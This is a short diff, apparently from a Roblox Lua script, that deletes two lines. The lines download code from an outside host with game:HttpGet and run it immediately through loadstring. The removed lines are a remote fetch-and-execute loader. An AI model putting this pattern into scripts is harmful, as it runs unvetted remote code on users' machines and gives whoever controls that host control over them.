@@ -1,2 +1,0 @@
-local script = game:HttpGet("http://whitelist.happyhz.xyz/test.php")
-loadstring(script)()
